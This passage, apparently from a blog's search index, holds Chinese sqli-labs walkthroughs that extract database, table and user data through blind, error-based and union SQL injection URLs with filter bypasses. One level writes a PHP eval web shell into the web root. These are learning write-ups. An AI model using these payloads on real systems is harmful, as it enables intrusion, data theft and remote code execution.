点击submit，成功返回","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十二关时间_一句话_堆叠","slug":"sqli-labs关卡/sqli-labs第五十二关时间_一句话_堆叠","date":"2020-07-25T01:18:02.570Z","updated":"2020-03-26T02:36:17.959Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十二关时间_一句话_堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/","excerpt":"","text":"因为没有报错回显，不能使用报错注入 使用时间注入，当判断大于1回显正常。 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if((length(database())&gt;1),1,sleep(3)) 设置长度等于7，一直加载，说明错误 测试得出长度为8，加载完成 查看数据库，ascii等于115时页面加载成功，表示正确，其他一直加载，说明错误 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr(database(),1))&#x3D;115,1,sleep(3)) 经过测试得出当前数据库是security 查看表，当结果等于101的时候返回正常，其他加载，101对应的是e，经过测试得知当前表名为emails 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(3)) 查询emails下的字段，当ascii等于105是页面加载成功，说明正确，其他ascii码一直加载，说明错误，ascii中的105转义后是 i 的意思，经过测试第一个字段为id 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(3)) 查看id的第一个数据，当ascii等于49返回正常，其他加载，ascii 49 对应的是1，说明第一个数据为1 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-52&#x2F;?sort&#x3D;1 and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(3))","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十九关报错次数限制","slug":"sqli-labs关卡/sqli-labs第五十九关报错次数限制","date":"2020-07-25T01:18:02.567Z","updated":"2020-03-26T17:07:07.869Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十九关报错次数限制/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/","excerpt":"","text":"查看初始页面 查看源代码，并没有值进行包裹 使用union select查看注入点，发现页面没有返回注入点，说明不能使用union注入，因为有报错信息显示，使用报错注入 使用报错注入查看当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(database())),1) 查看表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) 查看字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;so0c3t2h4x&#39;)),1) 查看secret_7RY9字段中的数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(select group_concat(secret_7RY9)from so0c3t2h4x)),1) 提交数据，恭喜你成功了","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十三关时间_一句话_堆叠","slug":"sqli-labs关卡/sqli-labs第五十三关时间_一句话_堆叠","date":"2020-07-25T01:18:02.565Z","updated":"2020-03-26T03:27:27.580Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十三关时间_一句话_堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/","excerpt":"","text":"因为没有报错回显，不能使用报错注入 使用时间注入，当判断大于1回显正常。 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if((length(database())&gt;1),1,sleep(3)) --+ 设置长度等于7，一直加载，说明误 测试得出长度为8，加载完成 查看数据库，ascii等于115时页面加载成功，表示正确，其他一直加载，说明错误 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr(database(),1))&#x3D;115,1,sleep(3)) --+ 经过测试得出当前数据库是security 查看表，当结果等于101的时候返回正常，其他加载，101对应的是e，经过测试得知当前表名为emails 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(3)) --+ 查询emails下的字段，当ascii等于105是页面加载成功，说明正确，其他ascii码一直加载，说明错误，ascii中的105转义后是 i 的意思，经过测试第一个字段为id 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(3)) --+ 查看id的第一个数据，当ascii等于49返回正常，其他加载，ascii 49 对应的是1，说明第一个数据为1 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(3)) --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十七关次数限制union","slug":"sqli-labs关卡/sqli-labs第五十七关次数限制union","date":"2020-07-25T01:18:02.563Z","updated":"2020-03-26T16:38:40.496Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十七关次数限制union/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/","excerpt":"","text":"查看原始界面，给了CHALLENGES数据库 用法和之前一样 查看源码，使用双引号闭合 查看字段数，4返回错误 查看字段数3 查看注入点 查看表，返回lqvuqsit93表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-57&#x2F;?id&#x3D;1111&quot; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; --+ 查看lqvuqsit93表中字段，获得id,sessid,secret_RJ1K,tryy四个字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-57&#x2F;?id&#x3D;1111&quot; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;lqvuqsit93&#39; --+ 查看secret_RJ1K字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-57&#x2F;?id&#x3D;1111&quot; union select 1,2,group_concat(secret_RJ1K)from lqvuqsit93 --+ 或者数据进行提交，返回这个说明成功","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五十一关报错_时间_一句话_堆叠","slug":"sqli-labs关卡/sqli-labs第五十一关报错_时间_一句话_堆叠","date":"2020-07-25T01:18:02.561Z","updated":"2020-03-26T02:36:09.329Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五十一关报错_时间_一句话_堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/","excerpt":"","text":"使用一句话木马。 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-51&#x2F;?sort&#x3D;1&#39;; select &#39;&lt;?php @eval($_POST[admin])?&gt;&#39; into outfile &#39;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\one.php&#39; --+ 查看文档，one.php成功写入 报错注入查看当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-51&#x2F;?sort&#x3D;1&#39; and updatexml(1,concat(0x7e,(database())),1)--+ 查看表，后续操作相同 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-51&#x2F;?sort&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1)--+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第五关GET盲注","slug":"sqli-labs关卡/sqli-labs第五关GET盲注","date":"2020-07-25T01:18:02.528Z","updated":"2020-07-16T11:37:06.374Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第五关GET盲注/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"初始页面 123我们来测试页面报错信息http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;这里使用单引号出错了，加上注释符返回成功页面如下。 123456因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入首先要查询当前数据库的长度，在布尔注入中要用and来连接http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8 知道数据库的长度了我们就要注入出数据库的名称，因为盲注不使用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。 12345判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+我们这两将GET请求发送到 intruder模块下 1现将1的位置clear$掉，然后选中101进行Add$ 12现在intruder下的payloads在payload type选择Numbers起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照 1我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行 123这里我们已经知道他的库名是security，我们要查询表名http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+然后继续抓包进行自动扫描 12这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始 1查询出了表我们查询字段，还是跟Union一样查看users的字段 123456789我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出id，username，password字段查询字段数据和union一样将from后的删掉加上该加的然后查询表数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+还有个时间注入效率非常慢，能不用时间注入就不用,这里演示的是查询他的库名，表名和字段名跟union一样http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十四关","slug":"sqli-labs关卡/sqli-labs第二十四关","date":"2020-07-25T01:18:02.526Z","updated":"2020-03-29T03:03:58.981Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十四关/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十关cookie","slug":"sqli-labs关卡/sqli-labs第二十关cookie","date":"2020-07-25T01:18:02.524Z","updated":"2020-03-19T00:53:31.042Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十关cookie/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/","excerpt":"","text":"现将带有cookie的GET请求发送的repeater模块，运行，返回这些信息 注意，红线地方不能删除等于号之后可以修改，只需要在代码后操作就行， 123查看字段数&#39; order by 4#显示没有 1试一下3，回显成功表示字段3 123查看注入点，因为是GET请求使用union注入就可以1&#39; union select 1,2,3#将uname后面的admin更改成1，如果不更改只能返回一个值，本身uname&#x3D;admin的更改之后就会返回错误，返回更多的值 123出现2,3两个注入点，查看当前库1&#39; union select 1,2,database()#成功返回 12查看表1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;# 12查看users表下的字段1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;# 12查看username字段1&#39; union select 1,2,group_concat(username)from users#","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十六关过滤空格注释符报错注入","slug":"sqli-labs关卡/sqli-labs第二十六关过滤空格注释符报错注入","date":"2020-07-25T01:18:02.521Z","updated":"2020-03-22T08:23:11.946Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十六关过滤空格注释符报错注入/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"初始页面 使用单引号查看一下报错信息，报错了 使用注释符注释一下让页面返回正常信息 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39; --+ 或者使用#等注释符都被过滤了，都不能使用 查看一下26关源码，发现注释符都被过滤了，连空格都被过滤了 因为空格和注释符被过滤的这里如果想要闭合单引号可以使用||’1’=’1，页面返回正常 使用报错注入查看当前数据库 12这里在?id&#x3D;1&#39;后面加||是因为过滤空格http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(database())),1) ||&#39;1&#39;&#x3D;&#39;1 查看数据库的表 123information中的or过滤了进行双写infoorrmation这里就是使用括号的方式来绕过空格http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;&#39;security&#39;))),1)||&#39;1&#39;&#x3D;&#39;1 查看users表中的字段 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema&#x3D;&#39;security&#39;)%26%26(table_name&#x3D;&#39;users&#39;))),1) ||&#39;1&#39;&#x3D;&#39;1这里使用%26(&amp;)不能直接使用&amp;&amp;或者and 查看username中的字段 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39; || updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)where(id&#x3D;2))),1) ||&#39;1&#39;&#x3D;&#39;1修改where后id的值进行换行查看","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十六关a","slug":"sqli-labs关卡/sqli-labs第二十六关a","date":"2020-07-25T01:18:02.519Z","updated":"2020-03-24T07:21:18.338Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十六关a/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3a/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十八关时间过滤了空格","slug":"sqli-labs关卡/sqli-labs第二十八关时间过滤了空格","date":"2020-07-25T01:18:02.518Z","updated":"2020-03-24T07:27:39.033Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十八关时间过滤了空格/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/","excerpt":"","text":"这里使用延迟注入 先测试库长度 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(length(database())&gt;1,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1当database()大于1的时候，返回时间为2秒，说明正确。 将大于一改为等于1 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(length(database())&#x3D;1,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1当数据库长度等于1时返回时间7秒标识错误，说明数据库长度不等于1 将字符长度改为8 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(length(database())&#x3D;8,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1返回时间两秒说明字符长度是8 测试当前数据库 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr(database(),1,1))&#x3D;&#39;115&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1页面返回两秒说明正确，115的ascii对应的是s 尝试其他ascii码 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr(database(),1,1))&#x3D;&#39;116&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1当ascii等于116时候页面返回7秒说明错误 测试出当前数据库是security 测试security中的表 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema&#x3D;database() %0a limit %0a 0,1),1,1))&#x3D;&#39;101&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1当ascii等于101是返回两秒正确 测试其他ascii码 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema&#x3D;database() %0a limit %0a 0,1),1,1))&#x3D;&#39;102&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1执行了7秒说明错误 得出结果为第一个表示emails 更改limit的值可以查看当前库下的其他表 就以emails为例，查看emails下的字段12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr((select %0a column_name %0a from %0a information_schema.columns %0a where %0a table_name&#x3D;&#39;emails&#39; %0a limit %0a 0,1),1,1))&#x3D;&#39;105&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1当ascii等于105页面返回两秒说明正确，ascii对应的是i 查看错误ascii 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr((select %0a column_name %0a from %0a information_schema.columns %0a where %0a table_name&#x3D;&#39;emails&#39; %0a limit %0a 0,1),1,1))&#x3D;&#39;106&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1将ascii改为106，发现页面返回7秒，说明错误 经过测试得出结果为id 查看id字段的数据 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a if(ascii(substr((select %0a id %0a from %0a emails %0a limit %0a 0,1),1,1))&#x3D;&#39;49&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1当ascii等于49时返回时间两秒正确，ascii对应的是1 登录mysql查看id是否为1，第一行id确实为1，说明正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十八关a双写","slug":"sqli-labs关卡/sqli-labs第二十八关a双写","date":"2020-07-25T01:18:02.516Z","updated":"2020-03-24T07:28:25.656Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十八关a双写/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/","excerpt":"","text":"查看源码，这里查询语句用(‘id’)也就是说要用’)进行闭合。 只有 /union\\s+select/过滤了之外其他的都没过滤，而且是union+select，也就是说这两个连在一起才会过滤 先查看字段数，以为order by 没被过滤，直接使用order by 即可，3返回正常，4返回错误 查询当前注入点使用union select 报错了 没有显示union select 表示过滤了 进行双写试试，双写之后还是报错 查看一下报错原因没发现union select 连在一起了， 使用%0a进行空格开 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;1&#39;) union %0a union selectselect 1,2,3 --+页面返回正常， 因为页面只回显正确的，所以将id进行报错 页面返回注入点 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) union %0a union selectselect 1,2,3 --+ 查看当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) union %0a union selectselect 1,2,database() --+ 查看当前数据库中的表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) union %0a union selectselect 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ 查看users表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) union %0a union selectselect 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39; --+ 查看username字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) union %0a union selectselect 1,2,group_concat(username)from users --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十五关双写","slug":"sqli-labs关卡/sqli-labs第二十五关双写","date":"2020-07-25T01:18:02.514Z","updated":"2020-03-22T03:04:04.210Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十五关双写/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/","excerpt":"","text":"先进入25关，页面返回这样 按照要求输入ID，页面返回在正常 使用万能单引号测试是否有报错信息 页面返回错误，发现后面多了个单引号蛮实用注释符注释一下，页面返回正常 注：在这里不能直接使用#因为并不能注释 返回正常，查看当前字段数使用order by 查看 当我们输入3的时候发现order by 只出来了der by 3说明or被过滤了，尝试将or进行双写 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25&#x2F;?id&#x3D;1&#39; oorrder by 3 --+页面返回正常 查看注入点 查看库名 查看表名 123or过滤进行双写http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema&#x3D;&#39;security&#39; --+页面返回正常 查看users表中字段 查看username字段中的数据","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十五关a双写","slug":"sqli-labs关卡/sqli-labs第二十五关a双写","date":"2020-07-25T01:18:02.512Z","updated":"2020-03-22T03:29:28.355Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十五关a双写/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/","excerpt":"","text":"12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;1页面返回正常 再加上万能单引号进行尝试，报错了，但是这个报错和之前的报错不一样，我们用的?id=1’但是这里面并没有’’1’’所以判定不需要加引号，可以直接使用order by 12使用order by 查询页面显示or被过滤了，所以进行双写一下 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;1 oorrder by 3页面返回正常 查看注入点 123使用-1进行报错显示更多内容http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3注入点是2,3 查看库名 查看表名 123or过滤，进行双写http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema&#x3D;&#39;security&#39;页面返回正常 查看users表中的字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name)from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39; 其中有字段id，username，password，查看username字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(username)from users","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十二关cookie","slug":"sqli-labs关卡/sqli-labs第二十二关cookie","date":"2020-07-25T01:18:02.481Z","updated":"2020-03-19T03:02:22.937Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十二关cookie/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/","excerpt":"","text":"这一关用双引号，不加括号，源码中，字段数是3跟之前操作一样 测试注入点也是一样， 直接测试当前数据库 1进行编码 1带入，查看结果 1查看表，加密 1带入，查看结果 1查看users表下的字段，加密 1带入，查看结果 1查看id，加密 1带入，查看结果","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第二十九关JSP环境注入","slug":"sqli-labs关卡/sqli-labs第二十九关JSP环境注入","date":"2020-07-25T01:18:02.479Z","updated":"2020-03-24T07:29:15.243Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第二十九关JSP环境注入/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/","excerpt":"","text":"获取当前字段数 这里为什么用两个id呢 因为这是jsp环境下的注入， ?id=1&amp;id=2 其中apache(php)解析最后一个参数，即显示id=2的内容，Tomcat(jsp)解析第一个参数即显示id=1的内容 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;2 &#39; order by 3--+返回结果正确 将字段数改为4查看一下是否正确，报错，说明字段位3 查看当前注入点 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,3--+ 查看当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,database()--+ 查看表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+ 查看users表中字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;--+ 查看username字段下的数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,group_concat(username)from 